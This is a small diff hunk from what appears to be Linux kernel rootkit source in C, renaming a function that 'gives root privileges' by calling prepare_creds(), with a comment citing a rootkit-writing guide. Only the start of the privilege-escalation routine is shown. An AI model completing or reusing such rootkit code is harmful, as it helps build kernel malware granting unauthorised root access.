@@ -3,7 +3,7 @@
 
 // based on http://big-daddy.fr/repository/Documentation/Hacking/Security/Malware/Rootkits/writing-rootkit.txt
 
-void makeRoot(void) {
+void getRoot(void) {
 	/* Here we give root privileges */
 	struct cred *new = prepare_creds();
 
